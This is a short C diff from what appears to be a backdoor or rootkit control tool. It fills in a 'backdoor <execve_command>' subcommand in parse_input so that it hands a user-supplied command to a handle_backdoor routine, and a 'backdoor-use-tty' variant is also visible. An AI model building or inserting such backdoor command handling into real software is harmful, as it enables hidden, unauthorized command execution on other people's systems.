@@ -49,7 +49,7 @@ parse_input(int argc, char **argv)
 
     if (ARGVCMP(1, "backdoor")) {
         ASSERT_ARGC(2, "backdoor <execve_command>");
-        // TODO: return backdoor handle
+        return (cmd_t){ handle_backdoor, (void *)argv[2] };
     }
 
     if (ARGVCMP(1, "backdoor-use-tty")) {
